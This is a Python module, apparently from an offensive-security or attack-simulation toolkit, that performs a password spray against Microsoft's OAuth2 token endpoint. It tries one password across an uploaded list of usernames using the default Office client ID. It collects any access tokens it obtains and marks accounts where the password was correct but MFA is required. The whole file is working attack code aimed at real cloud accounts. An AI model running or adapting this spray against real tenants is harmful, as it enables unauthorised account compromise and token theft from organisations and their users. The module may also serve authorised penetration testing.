'''
Module Name : Password_Spray
Module Description: Execute a password spray attack using a list of usernames
'''
import requests
import base64
import time

def TechniqueMain(password, wait = None, client_id = None, username_file_content = None):
    # input validation
    if password in [None, ""]:
        return False, {"Error" : "Invalid input : Password required"}, None
    if username_file_content in [None, ""]:
        return False, {"Error" : "Provide file containing usernames"}, None

    endpoint_url = "https://login.microsoft.com/common/oauth2/token"
    resource = "https://graph.microsoft.com"
    scope = ['openid']
    
    # create request header
    headers = {
        "Accept" : "application/json",
        "Content-Type" : "application/x-www-form-urlencoded"
    }

    if client_id in [None, ""]:
        client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c" # setting the default client to use if user does not specify

    if wait in [None,""]:
        wait = 5 # set default wait to 5 seconds

    # extract usernames from username text file
    content_string = username_file_content[0].split(',')[-1]
    decoded = base64.b64decode(content_string)
    try:
        text = decoded.decode('utf-8')
        user_list = text.split('\n')
        # remove duplicate usernames
        user_list = list(set(user_list))
    except Exception as e:
        # file decoding failed
        return False, {"Error" : e}, None

    # initialize variable to store password spray results
    spray_results = {}

    # start password spray
    for user_name in user_list:
        # request access token
        try:
            if user_name in [None, ""]:
                continue

            # create request payload
            data = {
                "grant_type": "password",
                "password" : password,
                "client_id" : client_id,
                "username" : user_name,
                "resource" : resource,
                "scope" : ' '.join(scope)
            }

            raw_response = requests.post(url = endpoint_url, headers = headers, data = data)
            
            # checking for failed authentication
            if 200 <= raw_response.status_code < 300:
                access_token = raw_response.json()['access_token']
                spray_results[user_name] = {"Success" : access_token}
            else:
                if 50076 in raw_response.json()['error_codes']:
                    spray_results[user_name] = {"Success" : "Password correct. MFA required for authentication"}
                else:
                    spray_results[user_name] = {"Failed" : raw_response.json()['error_description']}
                    raise Exception("Auth failed")

        except:
            # wait before attempting next username
            time.sleep(wait)

    # raw response same as pretty response
    raw_response = spray_results
    pretty_response = spray_results
    
    return True, raw_response, pretty_response

def TechniqueInputSrc() -> list:
    '''Returns the input fields required as parameters for the technique execution'''

    return [
        {"title" : "Password", "id" : "ps-password-text-input", "type" : "password", "placeholder" : "TheSecretSauce123", "element_type" : "dcc.Input"},
        {"title" : "Wait (Seconds)", "id" : "bf-text-input-username", "type" : "number", "placeholder" : "5", "element_type" : "dcc.Input"},
        {"title" : "App ID (Optional)", "id" : "bf-text-input-client-id", "type" : "text", "placeholder" : "Optional (Default: Microsoft Office)", "element_type" : "dcc.Input"},
        {"title" : "Username List File", "id" : "ps-username-file-uploader", "type" : "text", "placeholder" : "you got this right?", "element_type" : "dcc.Upload"}
    ]